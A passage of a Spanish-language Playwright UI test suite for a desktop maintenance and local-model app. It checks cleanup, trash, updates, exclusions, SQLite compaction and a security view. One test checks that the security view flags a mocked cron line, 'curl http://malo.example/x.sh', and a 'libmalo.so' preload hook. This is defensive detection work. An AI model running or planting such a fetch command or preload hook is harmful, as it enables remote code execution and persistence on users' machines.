  if ((limpieza.args.ids ?? []).includes("uv")) fallo("se intentó limpiar algo que se limpia con su propio comando");
  // Y lo más importante de esta vista: las HUELLAS no se pueden colar por aquí. Un
  // «marcar todo lo que ocupa» que se llevara el historial de bash sería el peor
  // fallo posible de esta pantalla.
  if ((limpieza.args.ids ?? []).some((id) => ["hist-bash", "recientes", "portapapeles-kde"].includes(id))) {
    fallo(`la limpieza se llevó huellas de actividad: ${JSON.stringify(limpieza.args.ids)}`);
  }
  if (/Historial de bash/.test(texto)) fallo("Optimización lista una huella de actividad, y no debería");

  // Arranque: la lista se lee y desactivar pasa por el backend (no toca /etc).
  await esperar(page, () => /arrancan con la sesión/i.test(document.body.innerText), "el bloque de arranque");
  const arranque = await page.evaluate(() => document.querySelector("#contenido")?.innerText ?? "");
  if (!/KAlendar/.test(arranque)) fallo("no se listan las entradas de arranque");
  if (!/2 activos/.test(arranque)) fallo("no se cuenta cuántas entradas están activas");
  // El nombre accesible del botón es su `aria-label` completo (dice QUÉ entrada).
  await pulsarBoton(page, "Desactivar KAlendar al arrancar");
  await page.waitForTimeout(300);
  const tras = await page.evaluate(() =>
    window.__LLAMADAS__.filter((l) => l.cmd === "action:run").map((l) => l.args.aj),
  );
  const cambio = tras.filter((a) => a.kind === "arranque:activar").at(-1);
  if (!cambio || cambio.args.id !== "org.kde.kalendar.autostart" || cambio.args.activo !== false) {
    fallo(`el cambio de arranque no llegó bien: ${JSON.stringify(cambio)}`);
  }

  // Y el enlace a la otra sección lleva DE VERDAD: las huellas no se limpian aquí,
  // así que el aviso no se queda en un texto, salta a donde sí se borran.
  await pulsarBoton(page, "Ver Seguridad");
  await esperar(page, () => /Qué se ejecuta sin que lo veas/i.test(document.body.innerText), "el salto a Seguridad");

  return "28.2 GB medidos · root deshabilitado y con su comando · filtro en el cliente sin reescanear · limpieza definitiva en dos pasos · arranque leído y desactivado · salto a Seguridad desde el aviso de huellas";
});

/* 27. Almacenamiento: repetidos, vacías y enlaces, con su borrado -------------- */
await t("27. Almacenamiento: repetidos, vacías y enlaces rotos, con su borrado", async () => {
  await irA(page, "Almacenamiento");
  await page.waitForSelector("#raiz-almacen", { timeout: 8000 });

  // Repetidos: se piden a mano (leen los ficheros) y dicen cuál se conserva.
  await pulsarBoton(page, "Repetidos");
  await pulsarBoton(page, "Buscar");
  await esperar(page, () => /la que se conserva/.test(document.body.innerText), "los grupos de repetidos");
  const rep = await page.evaluate(() => document.querySelector("#contenido")?.innerText ?? "");
  if (!/copia 2 de 3/.test(rep)) fallo(`no se enseña el grupo con sus copias: ${rep.slice(0, 400)}`);
  if (!/6\.0 GB|5\.6 GB/.test(rep)) fallo("no se dice lo que se puede liberar de los repetidos");

  // Marcar los repetidos deja SIEMPRE una copia: de 3 rutas, 2 marcadas.
  await pulsarBoton(page, "Marcar los repetidos (dejar una copia)");
  await page.waitForTimeout(150);
  const conSel = await page.evaluate(() => document.querySelector("#contenido")?.innerText ?? "");
  if (!/2 marcadas/.test(conSel)) fallo(`la selección de repetidos no deja una copia: ${conSel.match(/\d+ marcadas/)}`);

  await pulsarBoton(page, "Borrar selección");
  await pulsarBoton(page, "Sí, a la papelera");
  await page.waitForTimeout(300);
  const acciones = await page.evaluate(() =>
    window.__LLAMADAS__.filter((l) => l.cmd === "action:run").map((l) => l.args.aj),
  );
  const borrado = acciones.filter((a) => a.kind === "almacen:borrar").at(-1);
  if (!borrado) fallo("el borrado de repetidos no llegó al backend");
  if (borrado.args.rutas.length !== 2) fallo(`se mandaron ${borrado.args.rutas.length} rutas, se esperaban 2`);
  if (borrado.args.rutas.includes("/home/usuario/Descargas/pelicula.iso")) {
    fallo("se mandó a borrar la copia que se debía conservar");
  }

  // Vacías y enlaces rotos: cada una con su lista.
  await pulsarBoton(page, "Vacías");
  await pulsarBoton(page, "Buscar");
  await esperar(page, () => /proyecto-viejo\/build/.test(document.body.innerText), "las carpetas vacías");
  await pulsarBoton(page, "Enlaces rotos");
  await pulsarBoton(page, "Buscar");
  await esperar(page, () => /usr\/local\/bin\/viejo/.test(document.body.innerText), "los enlaces rotos");
  const enl = await page.evaluate(() => document.querySelector("#contenido")?.innerText ?? "");
  if (!/bin\/viejo/.test(enl)) fallo("no se enseña el enlace roto con su destino");

  return "grupos con «la que se conserva» · marcar repetidos deja una copia (2 de 3) · vacías y enlaces con su lista y su destino";
});

/* 28. La papelera se vacía en dos pasos y el Centro de recuperación restaura ---- */
await t("28. La papelera avisa antes de vaciarse y el Centro de recuperación restaura", async () => {
  await irA(page, "Optimización");
  await esperar(page, () => /Papelera del sistema/i.test(document.body.innerText), "el bloque de la papelera");
  const opt = await page.evaluate(() => document.querySelector("#contenido")?.innerText ?? "");
  if (!/75 elementos/.test(opt)) fallo(`no se dice cuánto hay en la papelera: ${opt.slice(0, 300)}`);
  // Y se recuerda lo que casi nadie sabe: hasta vaciarla, ese espacio no se libera.
  if (!/no se libera/i.test(opt)) fallo("no se dice que la papelera no libera espacio hasta vaciarla");

  await pulsarBoton(page, "Vaciar la papelera");
  const aviso = await page.evaluate(() => document.querySelector("#contenido [role=alert]")?.innerText ?? "");
  if (!/DEFINITIVAMENTE/.test(aviso)) fallo(`la confirmación no dice que es definitivo: ${aviso}`);
  await pulsarBoton(page, "Sí, vaciar");
  await page.waitForTimeout(300);
  const acciones = await page.evaluate(() =>
    window.__LLAMADAS__.filter((l) => l.cmd === "action:run").map((l) => l.args.aj),
  );
  if (!acciones.some((a) => a.kind === "papelera:vaciar")) fallo("vaciar la papelera no llegó al backend");

  // Centro de recuperación: la copia que ya no está no se puede restaurar.
  await irA(page, "Mantenimiento");
  await esperar(page, () => /Centro de recuperación/i.test(document.body.innerText), "el centro de recuperación");
  const mant = await page.evaluate(() => document.querySelector("#contenido")?.innerText ?? "");
  if (!/models\.json/.test(mant)) fallo("no se listan las copias");
  if (!/la copia ya no está/.test(mant)) fallo("no se dice que una de las copias ya no está en disco");

  const rota = page.getByRole("button", {
    name: "Restaurar /home/usuario/.config/autostart/x.desktop",
    exact: true,
  });
  if (!(await rota.isDisabled())) fallo("una copia que no existe no puede ofrecer restaurar");

  await pulsarBoton(page, "Restaurar /home/usuario/.pi/agent/models.json");
  await pulsarBoton(page, "Sí, restaurar /home/usuario/.pi/agent/models.json");
  await page.waitForTimeout(300);
  const acciones2 = await page.evaluate(() =>
    window.__LLAMADAS__.filter((l) => l.cmd === "action:run").map((l) => l.args.aj),
  );
  const rest = acciones2.filter((a) => a.kind === "copias:restaurar").at(-1);
  if (!rest || rest.args.id !== 1) fallo(`la restauración no llegó con su id: ${JSON.stringify(rest)}`);
  const tras = await page.evaluate(() => document.querySelector("#contenido")?.innerText ?? "");
  if (!/comprobado releyendo/.test(tras)) fallo("no se dice que la restauración se comprobó releyendo");

  return "papelera con su aviso y vaciado en dos pasos · copia inexistente sin botón · restauración en dos pasos, comprobada y con su id";
});

/* 29. Actualizaciones y limpieza programada ------------------------------------ */
await t("29. Las actualizaciones usan la herramienta del sistema y la programación no borra", async () => {
  await irA(page, "Mantenimiento");
  // No se comprueba sola al abrir: hay que pedirlo.
  const llamadasAntes = await page.evaluate(
    () => window.__LLAMADAS__.filter((l) => l.cmd === "actualizar:comprobar").length,
  );
  if (llamadasAntes !== 0) fallo(`al abrir se comprobó ${llamadasAntes} veces sin pedirlo`);
  await pulsarBoton(page, "Comprobar ahora");
  await esperar(page, () => /pendientes/.test(document.body.innerText), "el resultado de la comprobación");
  const mant = await page.evaluate(() => document.querySelector("#contenido")?.innerText ?? "");
  if (!/Aplicaciones Flatpak/.test(mant)) fallo("no se enseña la fuente de Flatpak");
  // La herramienta que no está instalada NO se enseña como una fuente disponible.
  if (/win-g?et|Aplicaciones \(winget\)/.test(mant)) fallo("se enseña una herramienta que no está instalada");
  // El comando que aplica es el de la herramienta, no uno nuestro.
  if (!/flatpak update/.test(mant)) fallo("no se enseña el comando que aplica");
  // Y el aviso de la propia herramienta se enseña tal cual (la letra pequeña de
  // rpm-ostree sobre su `--check`).
  if (!/unreliable/.test(mant)) fallo("no se enseña el aviso de la herramienta");
  // Aplicar se puede lanzar, y va por el mismo camino que los comandos de la app.
  // Se pulsa el de Flatpak, que es la fuente que SÍ tiene algo pendiente: el de la
  // imagen atómica está deshabilitado porque está al día.
  await pulsarBoton(page, "Ejecutar flatpak update");
  await page.waitForTimeout(250);
  const acciones = await page.evaluate(() =>
    window.__LLAMADAS__.filter((l) => l.cmd === "action:run").map((l) => l.args.aj),
  );
  const upd = acciones.filter((a) => a.kind === "update:run").at(-1);
  if (!upd || !String(upd.args.cmd).includes("flatpak update")) {
    fallo(`«Ejecutar» no lanzó el comando de la fuente: ${JSON.stringify(upd)}`);
  }

  await irA(page, "Optimización");
  await esperar(page, () => /Limpieza programada/i.test(document.body.innerText), "el bloque de programación");
  const opt = await page.evaluate(() => document.querySelector("#contenido")?.innerText ?? "");
  if (!/04:05|activada/.test(opt)) fallo(`no se enseña la programación guardada: ${opt.slice(0, 300)}`);
  // Lo que más importa: se dice que NO borra.
  if (!/No borra nada/i.test(opt)) fallo("no se dice que la limpieza programada no borra");
  // Y se dan las recetas para el planificador del sistema, en un bloque plegado.
  const receta = await page.$("details:has(pre)");
  if (!receta) fallo("no hay ninguna receta para el planificador del sistema");
  await page.evaluate(() => {
    for (const d of document.querySelectorAll("#contenido details")) d.open = true;
  });
  await page.waitForTimeout(150);
  const conRecetas = await page.evaluate(() => document.querySelector("#contenido")?.innerText ?? "");
  if (!/systemctl --user enable/.test(conRecetas)) fallo("la receta de systemd no dice cómo activarla");
  if (!/--aplicar/.test(conRecetas)) {
    fallo("no se dice qué habría que cambiar para que además borre");
  }

  return "comprobación bajo demanda · aviso de la herramienta tal cual · comando de la herramienta · «Ejecutar» por el mismo camino · programación con su hora, aviso de que NO borra y recetas para copiar";
});

/* 30. Seguridad: lo que se ejecuta solo, con su prueba, y las huellas una a una -- */
await t("30. Seguridad enseña la prueba de cada hallazgo y no borra huellas de un clic", async () => {
  await irA(page, "Seguridad");
  await esperar(page, () => /Qué se ejecuta sin que lo veas/i.test(document.body.innerText), "la revisión de seguridad");
  const texto = await page.evaluate(() => document.querySelector("#contenido")?.innerText ?? "");

  // El ALCANCE se dice en la propia pantalla. Si no, un «bien» se leería como
  // «este equipo está limpio», y eso no es lo que se ha comprobado.
  if (!/No es un antivirus/i.test(texto)) fallo("no se dice que esto no es un antivirus");
  // Y cada hallazgo lleva su PRUEBA y su ORIGEN: sin eso no se puede comprobar.
  if (!/libmalo\.so/.test(texto)) fallo("el hallazgo no enseña qué ha encontrado");
  if (!/\/etc\/ld\.so\.preload/.test(texto)) fallo("el hallazgo no enseña de dónde sale (la fuente)");
  if (!/curl http:\/\/malo\.example\/x\.sh/.test(texto)) fallo("el aviso del cron no enseña la línea que lo delata");
  if (!/crontab -l/.test(texto)) fallo("ni dice con qué se comprueba (la fuente del hallazgo del cron)");

  // Lo más grave, arriba; y lo que NO se pudo comprobar no se pinta como un «bien».
  const posProblema = texto.indexOf("Gancho de bibliotecas");
  const posOk = texto.indexOf("Programas que arrancan solos");
  if (!(posProblema >= 0 && posOk >= 0 && posProblema < posOk)) fallo("los hallazgos no van de más grave a menos");
  if (!/sin comprobar/.test(texto)) fallo("lo que no se pudo comprobar no se distingue de un «bien»");

  // Huellas: se listan, pero NO hay «marcar todo» (no se recuperan), y el botón de
  // borrar empieza deshabilitado.
  if (!/Historial de bash/.test(texto)) fallo("no se listan las huellas de actividad");
  if (!/más de 0 días|cualquiera/.test(texto)) fallo("no se dice la antigüedad mínima de cada huella");
  if (/Marcar todo/.test(texto)) fallo("hay un «marcar todo» en huellas: estas no se borran de un clic");
  const deshabilitado = await page.evaluate(
    () => [...document.querySelectorAll("#contenido button")].find((b) => /Borrar las marcadas/.test(b.innerText))?.disabled,
  );
  if (deshabilitado !== true) fallo("el botón de borrar huellas no empieza deshabilitado");

  // Una huella se marca UNA a una y el borrado dice que no se puede recuperar.
  await page.click('input[aria-label="Seleccionar Historial de bash"]');
  await page.waitForTimeout(120);
  await pulsarBoton(page, "Borrar las marcadas");
  const aviso = await page.evaluate(() => document.querySelector("#contenido [role=alert]")?.innerText ?? "");
  if (!/DEFINITIVAMENTE/.test(aviso)) fallo(`la confirmación no dice que es definitivo: ${aviso}`);
  if (!/no se pueden recuperar/i.test(aviso)) fallo(`la confirmación no dice que no se recupera: ${aviso}`);
  await pulsarBoton(page, "Sí, borrar de verdad");
  await page.waitForTimeout(300);

  // Y va SOLO la huella marcada, por su id: ni el resto de huellas ni nada más.
  const acciones = await page.evaluate(() =>
    window.__LLAMADAS__.filter((l) => l.cmd === "action:run").map((l) => l.args.aj),
  );
  const limpieza = acciones.filter((a) => a.kind === "limpieza:limpiar").at(-1);
  if (!limpieza) fallo("borrar las huellas no llegó al backend");
  if (JSON.stringify(limpieza.args.ids) !== JSON.stringify(["hist-bash"])) {
    fallo(`se borró otra cosa que la huella marcada: ${JSON.stringify(limpieza.args.ids)}`);
  }

  // El hallazgo del arranque no repite la lista que ya hay en Optimización: salta
  // allí, que es donde están los interruptores.
  await pulsarBoton(page, "Ver Optimización");
  await esperar(page, () => /Basura que se puede limpiar sin miedo/i.test(document.body.innerText), "el salto a Optimización");

  return "alcance dicho («no es un antivirus») · prueba y fuente de cada hallazgo · de más grave a menos · «sin comprobar» aparte de «bien» · huellas una a una, en dos pasos y sin «marcar todo» · salto a Optimización";
});

/* 31. Exclusiones: lo excluido no se mide ni se borra, y se dice por qué ------ */
await t("31. Las exclusiones se añaden, se ven resueltas y el analizador avisa de lo excluido", async () => {
  await irA(page, "Ajustes");
  await esperar(page, () => /exclusiones \(/i.test(document.body.innerText), "el bloque de exclusiones");
  const texto = await page.evaluate(() => document.querySelector("#contenido")?.innerText ?? "");
  // Se enseña a qué se resuelve el patrón: «${HOME}/VMs» no dice nada por sí solo.
  if (!/\/home\/usuario\/VMs/.test(texto)) fallo("no se enseña a qué carpeta se resuelve la exclusión");
  if (!/\$\{HOME\}\/VMs/.test(texto)) fallo("no se enseña el patrón tal como se escribió");
  // Y se dice QUÉ implica: no se mide ni se borra.
  if (!/no se mide ni se borra/i.test(texto)) fallo("no se explica qué hace una exclusión");
  if (!/node_modules/.test(texto)) fallo("no se explica el lenguaje (carpeta, patrón, nombre)");

  // Añadir: viaja al backend y aparece en la lista ya resuelta.
  await page.fill('input[aria-label="Carpeta o patrón que excluir"]', "${CACHE}/uv");
  await pulsarBoton(page, "Excluir");
  await esperar(page, () => /Excluido/.test(document.body.innerText), "la confirmación de exclusión");
  await esperar(page, () => /exclusiones \(3\)/i.test(document.body.innerText), "que suba el contador");
  const filas = await page.$$eval("#contenido li", (xs) => xs.map((x) => x.innerText));
  if (!filas.some((f) => f.includes("${CACHE}/uv"))) {
    fallo(`la exclusión añadida no está en la lista: ${JSON.stringify(filas)}`);
  }

  // Quitar: también viaja, y desaparece de la LISTA. Ojo con la aserción: el aviso
  // de confirmación NOMBRA el patrón («Quitada la exclusión «${CACHE}/uv»»), así que
  // mirar el texto entero daría un falso positivo: se miran las filas y el contador.
  await pulsarBoton(page, "Quitar");
  await esperar(page, () => /Quitada la exclusión/.test(document.body.innerText), "la confirmación de quitar");
  await esperar(page, () => /exclusiones \(2\)/i.test(document.body.innerText), "que baje el contador");
  const filas2 = await page.$$eval("#contenido li", (xs) => xs.map((x) => x.innerText));
  if (filas2.some((f) => f.includes("${CACHE}/uv"))) {
    fallo(`la exclusión quitada sigue en la lista: ${JSON.stringify(filas2)}`);
  }

  // Y en Optimización se DICE que hay objetivos sin medir por exclusiones: si no,
  // un total más bajo parecería un fallo del programa.
  await irA(page, "Optimización");
  await esperar(page, () => /no se han medido por tus exclusiones/.test(document.body.innerText), "el aviso de excluidos");
  const opt = await page.evaluate(() => document.querySelector("#contenido")?.innerText ?? "");
  if (!/Caché de Zypper/.test(opt)) fallo("no se dice QUÉ objetivo quedó fuera");
  if (!/\/var\/cache\/zypp/.test(opt)) fallo("no se dice QUÉ exclusión lo dejó fuera");
  // El aviso lleva a donde se cambian (sin repetir la lista ahí).
  await pulsarBoton(page, "Ver exclusiones");
  await esperar(page, () => /exclusiones \(/i.test(document.body.innerText), "el salto a Ajustes");

  return "patrón y resolución a la vista · qué implica, dicho · añadir y quitar por el backend · el analizador avisa de lo excluido y salta a Ajustes";
});

/* 32. Almacenamiento: lo que una exclusión dejó fuera, dicho ------------------- */
await t("32. Almacenamiento dice que una exclusión dejó parte del análisis fuera", async () => {
  await irA(page, "Almacenamiento");
  await esperar(page, () => /ocupa lo medido/i.test(document.body.innerText), "el rótulo del total");
  const texto = await page.evaluate(() => document.querySelector("#contenido")?.innerText ?? "");
  // El total NO puede llamarse «Ocupa en total» cuando hay algo excluido: sería
  // afirmar que eso es todo lo que ocupa.
  if (!/1 exclusión ha dejado fuera parte de este análisis/.test(texto)) {
    fallo(`no se dice que una exclusión dejó algo fuera: ${texto.slice(0, 300)}`);
  }
  if (!/\$\{HOME\}\/VMs/.test(texto)) fallo("no se dice QUÉ exclusión fue");
  // Y lleva a donde se cambia, sin repetir la lista aquí.
  await pulsarBoton(page, "Ver exclusiones");
  await esperar(page, () => /exclusiones \(/i.test(document.body.innerText), "el salto a Ajustes");

  return "el total se llama «lo medido» · la exclusión que actuó, con su patrón · salto a Ajustes";
});

/* 33. Bases de datos: medir, respetar el bloqueo y decir lo liberado de verdad -- */
await t("33. Bases SQLite: mide lo recuperable, respeta lo bloqueado y dice lo que se liberó", async () => {
  await irA(page, "Optimización");
  await esperar(page, () => /espacio recuperable sin borrar nada/i.test(document.body.innerText), "el bloque de bases de datos");
  const texto = await page.evaluate(() => document.querySelector("#contenido")?.innerText ?? "");

  // Cifra MEDIDA (la que devuelve SQLite), no una estimación. La interfaz escribe
  // los MB enteros por debajo de 1 GiB, así que el mock son 5 MiB → «5 MB».
  if (!/5 MB/.test(texto)) fallo(`no se enseña el total recuperable: ${texto.slice(0, 400)}`);
  if (!/1 base con páginas libres/.test(texto)) fallo("no se dice cuántas bases tienen páginas libres");
  // Las otras dos NO se convierten en un 0: una está bloqueada con su proceso y la
  // otra no se pudo medir. Son estados distintos y se dicen.
  if (!/bloqueada/i.test(texto)) fallo("no se dice que una base está bloqueada");
  if (!/Code \(pid 4321\)/.test(texto)) fallo("no se dice qué proceso la tiene abierta");
  if (!/permission denied|sin permiso/i.test(texto)) fallo("no se dice que otra no se pudo medir");
  // La app lo hace sola: el comando a mano es una nota, no el camino principal.
  if (!/no hace falta/i.test(texto)) fallo("no se dice que el VACUUM lo hace la app");

  // Compactar: dos pasos, y el resultado es lo liberado DE VERDAD (medido antes y después).
  await pulsarBoton(page, "Compactar las que se puedan");
  const aviso = await page.evaluate(() => document.querySelector("#contenido [role=alert]")?.innerText ?? "");
  if (!/se compactarán TODAS/i.test(aviso)) fallo(`la confirmación no explica qué va a hacer: ${aviso}`);
  if (!/se dejan como están/i.test(aviso)) fallo("la confirmación no avisa de que las bloqueadas no se tocan");
  await pulsarBoton(page, "Sí, compactar");
  await esperar(page, () => /Se liberaron 3\.5 MB/.test(document.body.innerText), "el resultado medido de la compactación");
  const tras = await page.evaluate(() => document.querySelector("#contenido")?.innerText ?? "");
  if (!/1 base compactada/.test(tras)) fallo("no se dice cuántas se compactaron");
  if (!/1 quedó bloqueada/.test(tras)) fallo("no se dice cuál quedó bloqueada tras el intento");

  return "cifra medida de SQLite · bloqueo con su proceso, no un 0 · lo no medido, dicho · VACUUM propio en dos pasos · resultado medido antes y después";
});

/* 34. Borrar un modelo servido: se avisa y se para antes ----------------------- */
await t("34. Borrar un modelo que se está sirviendo avisa y lo para antes", async () => {
  await irA(page, "En disco");
  await esperar(page, () => /mimo-9b-q8_0\.gguf/.test(document.body.innerText), "el inventario de modelos");
  // El nombre accesible del botón dice de QUÉ fichero es (WCAG 2.5.3).
  await pulsarBoton(page, "Borrar mimo-9b-q8_0.gguf (se moverá a la papelera)");
  const aviso = await page.evaluate(() => document.querySelector("#contenido [role=alert]")?.innerText ?? "");
  if (!/PAPELERA/.test(aviso)) fallo(`la confirmación no dice a dónde va: ${aviso}`);
  // Lo que Magnitude arregló con un mensaje claro, aquí además se hace: el motor
  // se para antes de borrar, y se dice ANTES de pulsar.
  if (!/se está sirviendo ahora \(MiMo 9B \(Q8_0\)\)/.test(aviso)) {
    fallo(`no se avisa de que se está sirviendo: ${aviso}`);
  }
  if (!/se parará antes de borrarlo/.test(aviso)) fallo("no se dice que se parará antes de borrar");
  return "el aviso sale al confirmar, dice que se está sirviendo y que se parará antes";
});

/* 35. Lo que la app necesita: detectado, instalable y lo de root con su comando -- */
await t("35. Lo que la app necesita: se instala solo lo que se puede y lo de root trae comando", async () => {
  await irA(page, "Ajustes");
  await esperar(page, () => /lo que ai hub necesita/i.test(document.body.innerText), "la tarjeta de provisión");
  const texto = await page.evaluate(() => document.querySelector("#contenido")?.innerText ?? "");

  // Lo instalado dice de dónde salió y qué versión es: sin eso, una lista de
  // binarios no dice nada.
  if (!/llmfit 1\.1\.16/.test(texto)) fallo(`no se enseña la versión de lo instalado: ${texto.slice(0, 300)}`);
  if (!/github\.com\/AlexsJones\/llmfit/.test(texto)) fallo("no se dice de dónde sale cada herramienta");
  // Y se dice PARA QUÉ es cada una.
  if (!/encaje medido/i.test(texto)) fallo("no se dice para qué sirve lo que falta");
  // Lo que necesita root NO se finge: se detecta, se dice por qué y trae el comando.
  if (!/ROCm/.test(texto)) fallo("no se dice de dónde sale lo que no se puede instalar");
  if (!/sudo dnf install rocm-smi/.test(texto)) fallo("no se ofrece el comando exacto de lo que necesita root");
  if (!/no instala paquetes del sistema/i.test(texto)) fallo("no se explica por qué eso no se instala solo");

  // Preparar todo: viaja al backend y la tarjeta se relee con lo instalado.
  await pulsarBoton(page, "Preparar todo");
  await esperar(page, () => /Instaladas 1 de 1/.test(document.body.innerText), "el resultado de preparar todo");
  const tras = await page.evaluate(() => document.querySelector("#contenido")?.innerText ?? "");
  if (!/necesita root \(amd-smi\)/.test(tras)) fallo("no se dice qué queda pendiente de root tras instalar");
  if (!/Comprobar ahora/.test(tras)) fallo("no se puede recomprobar el estado sin reiniciar");

  return "versión y origen de lo instalado · para qué sirve lo que falta · lo de root con su comando y su motivo · «Preparar todo» y recomprobar";
});

/* 36. Autorreparación: lo que la app se arregla sola y lo que no pudo ---------- */
await t("36. Autorreparación: cuenta qué se arregló (con la ruta) y qué no pudo", async () => {
  const llamadasAntes = await page.evaluate(
    () => window.__LLAMADAS__.filter((l) => l.cmd === "salud:revisar").length,
  );
  await irA(page, "Diagnóstico");
  await esperar(page, () => /autorreparación/i.test(document.body.innerText), "la tarjeta de autorreparación");
  const texto = await page.evaluate(() => document.querySelector("#contenido")?.innerText ?? "");

  // El resumen de una línea y las tres cosas: lo correcto, lo reparado y lo que
  // no se pudo. Un «no se pudo» SIEMPRE dice qué haría falta.
  if (!/1 reparada \/ 1 sin arreglar/.test(texto)) fallo(`no se resume lo que ha pasado: ${texto.slice(0, 400)}`);
  if (!/data\.db\.corrupta-/.test(texto)) fallo("no se dice DÓNDE quedó la base apartada");
  if (!/NO se ha borrado/i.test(texto)) fallo("no se dice que la base dañada no se ha borrado");
  if (!/No hay copia de seguridad/.test(texto)) fallo("no se dice por qué no se pudo arreglar la configuración");
  if (!/Vuelve a escribir la configuración/.test(texto)) fallo("lo que no se pudo arreglar no dice qué hacer");

  // Mirar NO repara: al abrir la sección se comprueba sin tocar nada (si no, una
  // visita a Diagnóstico cambiaría cosas del equipo).
  const abriendo = await page.evaluate(
    () => window.__LLAMADAS__.filter((l) => l.cmd === "salud:revisar").map((l) => l.args?.args?.reparar ?? false),
  );
  if (abriendo.some((r) => r === true)) fallo("abrir Diagnóstico ha lanzado una reparación");

  // Y «Reparar ahora» sí la lanza, explícitamente.
  await pulsarBoton(page, "Reparar ahora");
  await esperar(
    page,
    () => window.__LLAMADAS__.filter((l) => l.cmd === "salud:revisar" && l.args?.args?.reparar === true).length > 0,
    "la reparación a mano",
  );
  const despues = await page.evaluate(
    () => window.__LLAMADAS__.filter((l) => l.cmd === "salud:revisar").length,
  );
  if (despues <= llamadasAntes + 1) fallo("«Reparar ahora» no ha vuelto a comprobar");

  return "resumen de una línea · lo reparado con su ruta · lo que no se pudo con qué hacer · mirar no repara · el botón sí";
});

/* 37. Histórico: lo que ha crecido (y lo que ha bajado), con la fecha de cada medida - */
await t("37. El histórico dice qué ha cambiado, con las fechas y sin inventar el %", async () => {
  await irA(page, "Almacenamiento");
  await esperar(page, () => /cómo ha cambiado/i.test(document.body.innerText), "el bloque de cambios");
  const texto = await page.evaluate(() => document.querySelector("#contenido")?.innerText ?? "");

  // El delta total, con su signo y con las fechas de las DOS medidas: una cifra de
  // crecimiento sin decir desde cuándo no significa nada.
  if (!/\+11\.5 GB/.test(texto)) fallo(`no se enseña el crecimiento total: ${texto.slice(0, 400)}`);
  if (!/models/.test(texto)) fallo("no se dice qué es lo que más ha crecido");
  if (!/\+8\.8 GB/.test(texto)) fallo("no se enseña el delta de lo que más ha crecido");
  // Lo que BAJA también es información: se enseña, con su delta (el que baja poco
  // se escribe en MB, no en GB: 95 MB, no «0,1 GB»).
  if (!/ha bajado/i.test(texto)) fallo("no se dice lo que ha bajado");
  if (!/\.local/.test(texto)) fallo("no se dice QUÉ ha bajado");
  if (!/95 MB/.test(texto)) fallo("no se enseña cuánto ha bajado");
  // Y un hijo que antes estaba a cero NO lleva porcentaje inventado.
  if (!/sin base para el %/.test(texto)) fallo("se ha inventado un porcentaje donde no hay base");

  return "crecimiento total con dos fechas · lo que más ha crecido con su delta · lo que ha bajado · sin porcentajes inventados";
});

/* ── Capturas (para mirar la pantalla, no para aprobar) ──────────────────── */

if (process.env.CAPTURAS) {
  const dir = process.env.CAPTURAS;
  const cdp2 = await contexto.newCDPSession(page);
  await cdp2.send("Emulation.setDeviceMetricsOverride", { width: 1280, height: 800, deviceScaleFactor: 1, mobile: false });
  await irA(page, "En disco");
  await page.screenshot({ path: `${dir}/modelos-1280.png` });
  await irA(page, "Rendimiento");
  await page.screenshot({ path: `${dir}/rendimiento-1280.png` });
  // Estimación y medición sirviendo, ya calculadas, para poder MIRARLAS.
  await page.fill("#estim-modelo", "Qwen2.5 32B Instruct");
  await page.fill("#estim-contexto", "65536");
  await pulsar(page, 'button:text-is("Calcular plan")');
  await pulsar(page, 'button:text-is("Calcular concurrencia")');
  await page.evaluate(() => document.querySelector("#estimacion-llmfit")?.scrollIntoView());
  await page.waitForTimeout(200);
  await page.screenshot({ path: `${dir}/rendimiento-estimacion-1280.png` });
  await page.evaluate(() => document.querySelector("#medicion-servidor")?.scrollIntoView());
  await page.waitForTimeout(200);
  await page.screenshot({ path: `${dir}/rendimiento-medir-1280.png` });
  await irA(page, "Diagnóstico");
  await page.screenshot({ path: `${dir}/diagnostico-1280.png` });
  await irA(page, "Servidores");
  await pulsar(page, 'button[aria-label^="Ver el log del motor"]');
  await page.screenshot({ path: `${dir}/servidores-1280.png` });
  await irA(page, "Conexiones");
  // Con el bloque ya generado, para poder mirarlo.
  await pulsar(page, 'button:text-is("Generar bloque")');
  await page.evaluate(() => document.querySelector("#clientes-conectados")?.scrollIntoView());
  await page.waitForTimeout(200);
  await page.screenshot({ path: `${dir}/conexiones-1280.png` });
  await irA(page, "Inicio");
  await page.screenshot({ path: `${dir}/inicio-1280.png` });
  await irA(page, "Hardware");
  await page.screenshot({ path: `${dir}/hardware-1280.png` });
  await irA(page, "En disco");
  await page.screenshot({ path: `${dir}/disco-1280.png` });
  await irA(page, "Almacenamiento");
  await page.screenshot({ path: `${dir}/almacenamiento-1280.png` });
  await irA(page, "Optimización");
  await page.screenshot({ path: `${dir}/optimizacion-1280.png` });
  await irA(page, "Seguridad");
  await page.screenshot({ path: `${dir}/seguridad-1280.png` });
  await cdp2.send("Emulation.setDeviceMetricsOverride", { width: 960, height: 640, deviceScaleFactor: 1, mobile: false });
  await irA(page, "En disco");
  await page.screenshot({ path: `${dir}/modelos-960.png` });
  await cdp2.send("Emulation.clearDeviceMetricsOverride");
  console.log(`(capturas en ${dir})`);
}

/* ── Informe ─────────────────────────────────────────────────────────────── */

await page.close();
const fallos = res.filter((r) => !r.ok);
console.log("\n=== VERIFICACIÓN DE INTERFAZ machinograph (Brave por CDP) ===\n");
for (const r of res) console.log(`${r.ok ? "OK  " : "FALLO"} ${r.nombre}\n      ${r.detalle}`);
if (recursos404.length > 0) {
  console.log(`\n(nota) recursos 404 que no son de src/** ni cuentan como fallo de interfaz: ${[...new Set(recursos404)].join(", ")}`);
}
console.log(`\n${res.length - fallos.length}/${res.length} comprobaciones en verde`);
if (omitidas.length > 0) {
  console.log(`\n(omitidas ${omitidas.length}: NO cuentan como verdes, no se han podido hacer aquí)`);
  for (const o of omitidas) console.log(`  OMITIDA ${o.nombre}\n      ${o.motivo}`);
}
process.exit(fallos.length === 0 ? 0 : 1);
